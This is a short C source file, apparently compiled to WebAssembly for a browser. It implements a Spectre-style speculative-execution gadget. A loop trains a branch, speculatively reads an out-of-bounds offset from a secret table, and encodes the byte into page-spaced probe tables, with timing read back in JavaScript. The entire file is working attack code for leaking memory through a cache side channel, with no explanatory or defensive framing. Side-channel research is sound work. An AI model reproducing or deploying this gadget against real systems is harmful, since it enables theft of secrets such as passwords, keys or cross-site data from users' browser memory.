#include <stdlib.h>

typedef unsigned char byte;

//  extern void startTimer();
// extern unsigned stopTimer();
extern void _log(unsigned argument);
extern unsigned probeTable(byte* probe_table_address);

byte secret_table[1];

byte junk = 0;

byte* getSecretTableAddress() {
    return secret_table;
}

unsigned TRAINING_CONSTANT = 10;
unsigned training_counter = 0;

byte speculativelyReadAddress(unsigned address, unsigned repetitions, unsigned page_size, unsigned probe_length) {
    unsigned index = address - (unsigned) secret_table;
    byte* valid_access_indicator_array = (byte*) malloc(repetitions * TRAINING_CONSTANT * page_size);
    // one valid-dummy space for each iteration (inefficient but simple)
    byte* probe_tables = (byte*) malloc((repetitions * probe_length + 1) * page_size);
    training_counter = 0;
    for (unsigned i = 0; i < repetitions * TRAINING_CONSTANT; ++i) {
        const byte invalid_access = !((i + 1) % TRAINING_CONSTANT);
        const unsigned fixed_index = index & -invalid_access;
        // load condition from RAM so speculative execution gets triggered
        // _log(fixed_index);
        if (~valid_access_indicator_array[i * page_size] & !invalid_access) {
            const byte secret_value = secret_table[fixed_index];
            // _log((secret_value & -invalid_access | !invalid_access << 8) * page_size);
            // map valid accesses to the address (probe_tables)
            // map invalid accesses to their respective probe boxes
            junk ^= probe_tables[(1 + i * probe_length + secret_value) * page_size & -invalid_access];
        }
        // _log(89);
        if (invalid_access) {
            // probe table
            // timing results are stored in JS-land
            byte* probe_table = probe_tables + (1 + training_counter++ * probe_length) * page_size;
            probeTable(probe_table);
        }
    }
    // freeing not possible due to WASM linear memory and FIRST_USE_PARADIGM
    // just reset the current_memory_position without zeroing
    free(valid_access_indicator_array);
    return junk;
}